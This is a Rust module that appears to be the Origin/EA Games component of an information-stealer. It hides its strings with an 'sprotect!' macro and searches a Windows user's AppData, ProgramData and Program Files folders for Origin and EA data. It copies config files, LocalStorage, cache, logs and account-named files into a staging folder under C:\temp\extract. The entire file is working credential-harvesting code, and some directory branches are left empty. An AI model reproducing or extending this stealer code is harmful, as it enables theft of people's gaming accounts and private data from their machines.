use crate::sprotect;
use std::path::PathBuf;
use std::fs;

pub async fn extract() -> Result<(), Box<dyn std::error::Error>> {
    let output_dir = sprotect!("C:\\temp\\extract\\Games\\Origin");
    std::fs::create_dir_all(&output_dir)?;

    let origin_paths = detect_origin_paths().await;
    
    for origin_path in origin_paths {
        extract_origin_data(&origin_path, &output_dir).await?;
    }

    Ok(())
}

async fn detect_origin_paths() -> Vec<PathBuf> {
    let mut paths = Vec::new();
    
    let userprofile = std::env::var(sprotect!("USERPROFILE")).unwrap_or_default();
    let programdata = std::env::var(sprotect!("PROGRAMDATA")).unwrap_or_default();
    
    let origin_locations = vec![
        format!("{}{}", userprofile, sprotect!("\\AppData\\Roaming\\Origin")),
        format!("{}{}", userprofile, sprotect!("\\AppData\\Local\\Origin")),
        format!("{}{}", userprofile, sprotect!("\\AppData\\Roaming\\EA Games")),
        format!("{}{}", userprofile, sprotect!("\\AppData\\Local\\EA Games")),
        format!("{}{}", programdata, sprotect!("\\Origin")),
        format!("{}{}", programdata, sprotect!("\\EA Games")),
        sprotect!("C:\\Program Files\\Origin"),
        sprotect!("C:\\Program Files (x86)\\Origin"),
        sprotect!("C:\\Program Files\\EA Games"),
        sprotect!("C:\\Program Files (x86)\\EA Games"),
    ];

    for path_str in origin_locations {
        let path = PathBuf::from(path_str);
        if path.exists() {
            paths.push(path);
        }
    }

    paths
}

async fn extract_origin_data(origin_path: &PathBuf, output_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    let origin_name = origin_path.file_name().unwrap_or_default().to_string_lossy();
    let origin_output = format!("{}\\{}", output_dir, origin_name);
    std::fs::create_dir_all(&origin_output)?;

    extract_origin_configs(&origin_path, &origin_output).await?;
    extract_origin_cache(&origin_path, &origin_output).await?;
    extract_origin_logs(&origin_path, &origin_output).await?;
    
    Ok(())
}

async fn extract_origin_configs(origin_path: &PathBuf, output_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    let config_files = vec![
        sprotect!("local.xml"),
        sprotect!("user.xml"),
        sprotect!("settings.xml"),
        sprotect!("OriginSettings.xml"),
        sprotect!("OriginClient.exe.config"),
    ];

    for config_file in config_files {
        let config_path = origin_path.join(&config_file);
        if config_path.exists() {
            let dest_path = format!("{}\\{}", output_dir, config_file);
            fs::copy(&config_path, dest_path).ok();
        }
    }

    scan_for_origin_configs(origin_path, output_dir).await?;
    Ok(())
}

async fn extract_origin_cache(origin_path: &PathBuf, output_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    let cache_dirs = vec![
        sprotect!("OriginThinSetupInternal"),
        sprotect!("CacheStorage"),
        sprotect!("LocalStorage"),
        sprotect!("Logs"),
    ];

    for cache_dir in cache_dirs {
        let cache_path = origin_path.join(&cache_dir);
        if cache_path.exists() {
            let cache_output = format!("{}\\{}", output_dir, cache_dir);
            copy_selective_origin_files(&cache_path, &cache_output).await?;
        }
    }

    Ok(())
}

async fn extract_origin_logs(origin_path: &PathBuf, output_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    let log_patterns = vec![
        sprotect!("Origin"),
        sprotect!("EA"),
        sprotect!("Logs"),
    ];

    for log_pattern in log_patterns {
        scan_for_origin_logs(origin_path, &log_pattern, output_dir).await?;
    }

    Ok(())
}

async fn scan_for_origin_configs(dir: &PathBuf, output_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    if let Ok(entries) = fs::read_dir(dir) {
        for entry in entries.flatten() {
            let path = entry.path();
            
            if path.is_file() {
                let file_name = path.file_name().and_then(|n| n.to_str()).unwrap_or("").to_string();
                if is_origin_config_file(&file_name) {
                    let dest_path = format!("{}\\{}", output_dir, file_name);
                    fs::copy(&path, dest_path).ok();
                }
            } else if path.is_dir() {
                let dir_name = path.file_name().and_then(|n| n.to_str()).unwrap_or("").to_string();
                if is_origin_config_dir(&dir_name) {
                    let new_dest = format!("{}\\{}", output_dir, dir_name);
                    
                }
            }
        }
    }
    Ok(())
}

async fn scan_for_origin_logs(dir: &PathBuf, pattern: &str, output_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    if let Ok(entries) = fs::read_dir(dir) {
        for entry in entries.flatten() {
            let path = entry.path();
            
            if path.is_file() {
                let file_name = path.file_name().and_then(|n| n.to_str()).unwrap_or("").to_string();
                if file_name.to_lowercase().contains(&pattern.to_lowercase()) && 
                   is_origin_log_file(&file_name) {
                    let dest_path = format!("{}\\{}", output_dir, file_name);
                    fs::copy(&path, dest_path).ok();
                }
            } else if path.is_dir() {
                
            }
        }
    }
    Ok(())
}

async fn copy_selective_origin_files(src_dir: &PathBuf, dest_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    std::fs::create_dir_all(dest_dir)?;

    if let Ok(entries) = fs::read_dir(src_dir) {
        for entry in entries.flatten() {
            let path = entry.path();
            
            if path.is_file() {
                let file_name = path.file_name().and_then(|n| n.to_str()).unwrap_or("").to_string();
                if is_origin_important_file(&file_name) {
                    let dest_path = format!("{}\\{}", dest_dir, file_name);
                    fs::copy(&path, dest_path).ok();
                }
            } else if path.is_dir() {
                let dir_name = path.file_name().and_then(|n| n.to_str()).unwrap_or("").to_string();
                if is_origin_important_dir(&dir_name) {
                    let new_dest = format!("{}\\{}", dest_dir, dir_name);
                    
                }
            }
        }
    }
    Ok(())
}

fn is_origin_config_file(filename: &str) -> bool {
    let filename_lower = filename.to_lowercase();
    let config_extensions = [sprotect!(".xml"), sprotect!(".config"), sprotect!(".ini"), sprotect!(".json")];
    let config_keywords = [sprotect!("origin"), sprotect!("setting"), sprotect!("config"), sprotect!("user"), sprotect!("local")];
    
    config_extensions.iter().any(|ext| filename_lower.ends_with(ext)) &&
    config_keywords.iter().any(|keyword| filename_lower.contains(keyword))
}

fn is_origin_log_file(filename: &str) -> bool {
    let filename_lower = filename.to_lowercase();
    let log_extensions = [sprotect!(".log"), sprotect!(".txt"), sprotect!(".dat")];
    
    log_extensions.iter().any(|ext| filename_lower.ends_with(ext))
}

fn is_origin_important_file(filename: &str) -> bool {
    let filename_lower = filename.to_lowercase();
    let important_extensions = [sprotect!(".xml"), sprotect!(".json"), sprotect!(".ini"), sprotect!(".log"), sprotect!(".dat"), sprotect!(".db")];
    let important_keywords = [sprotect!("user"), sprotect!("account"), sprotect!("config"), sprotect!("setting"), sprotect!("origin"), sprotect!("cache")];
    
    important_extensions.iter().any(|ext| filename_lower.ends_with(ext)) ||
    important_keywords.iter().any(|keyword| filename_lower.contains(keyword))
}

fn is_origin_config_dir(dirname: &str) -> bool {
    let dirname_lower = dirname.to_lowercase();
    let config_dirs = [sprotect!("config"), sprotect!("setting"), sprotect!("user"), sprotect!("data")];
    
    config_dirs.iter().any(|dir| dirname_lower.contains(dir))
}

fn is_origin_important_dir(dirname: &str) -> bool {
    let dirname_lower = dirname.to_lowercase();
    let important_dirs = [sprotect!("cache"), sprotect!("storage"), sprotect!("data"), sprotect!("log"), sprotect!("config")];
    
    important_dirs.iter().any(|dir| dirname_lower.contains(dir))
}